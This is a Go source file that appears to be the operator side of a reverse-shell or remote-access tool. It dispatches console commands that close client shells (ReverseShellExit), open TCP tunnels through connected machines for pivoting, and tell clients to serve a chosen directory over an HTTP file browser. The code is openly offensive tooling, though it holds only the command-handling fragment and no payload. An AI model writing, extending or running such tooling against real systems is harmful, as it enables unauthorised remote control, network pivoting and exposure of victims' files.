package protocol

import (
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
)

func (p *protocolProvider) processCommand(input string) bool {
	args := strings.Split(strings.TrimSpace(input), " ")
	switch strings.ToLower(args[0]) {
	case "/stop":
		fmt.Println("Stopping server...")
		for _, v := range p.connections {
			sendPdu(v.conn, &ReverseShellExit{})
			v.conn.Close()
		}
		os.Exit(0)
		return true
	case "/say":
		fmt.Println("[Server]: Hello!")
		return true
	case "/exit":
		for _, c := range p.connections {
			if c.active {
				sendPdu(c.conn, &ReverseShellExit{})
				c.conn.Close()
			}
		}
		return true
	case "/tcp":
		p.tcpTunnelHandler(args[1:])
		return true
	case "/close-tcp":
		p.closeTcpTunnelHandler(args[1:])
		return true
	case "/file":
		p.fileBrowserHandler(args[1:])
		return true
	}

	return false
}
func (p *protocolProvider) fileBrowserHandler(args []string) {
	if len(args) < 3 {
		fmt.Println("Usage: /file <ip> <port> <root>")
		return
	}
	ip := args[0]
	port := args[1]
	root := args[2]

	for _, c := range p.connections {
		if !c.active {
			continue
		}
		fmt.Printf("[Server]: open file browser on http://%s:%s -> %s\n", ip, port, root)

		responsePdu := &FileBrowserOpen{
			Ip:   ip,
			Port: port,
			Root: root,
		}

		sendPdu(c.conn, responsePdu)
	}
}

func (p *protocolProvider) closeTcpTunnelHandler(args []string) {
	if len(args) < 1 {
		fmt.Println("Usage: /close-tcp <host port>")
		return
	}

	port, err := strconv.Atoi(args[0])
	if err != nil {
		fmt.Println("Usage: /close-tcp <host port>")
		return
	}

	for _, c := range p.connections {
		for k := range c.listener {
			if k == port {
				fmt.Println("closing tcp listener ", k)
				c.listener[k].cancel()
			}
		}
	}

}
func (p *protocolProvider) tcpTunnelHandler(args []string) {
	if len(args) < 3 {
		log.Println("usage: /tcp <dst ip> <dst port> <host port>")
		return
	}

	proxyAddress := args[0]
	proxyPort, err := strconv.Atoi(args[1])
	if err != nil {
		log.Println(err)
		return
	}
	listenPort := args[2]

	for _, c := range p.connections {
		if !c.active {
			continue
		}
		tunnelPort := c.startListenFor(proxyAddress, proxyPort, listenPort)
		fmt.Printf("start tunnel :%d->%s:%s\n", tunnelPort, proxyAddress, listenPort)

		responsePdu := &ListenResponse{
			tunnelAddress: "0.0.0.0",
			tunnelPort:    tunnelPort,
			proxyAddress:  proxyAddress,
			proxyPort:     proxyPort,
		}

		sendPdu(c.conn, responsePdu)
	}
}
